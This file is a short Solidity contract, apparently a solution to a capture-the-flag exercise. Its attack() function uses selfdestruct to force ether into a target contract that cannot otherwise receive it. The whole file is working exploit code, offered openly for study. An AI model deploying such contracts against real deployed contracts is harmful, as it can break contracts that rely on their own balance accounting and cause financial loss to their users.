// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract ForceAttacker {
    address public force;

    constructor(address _force) {
        force = _force;
    }

    function attack() external {
        selfdestruct(payable(force));
    }

    receive() external payable {}
}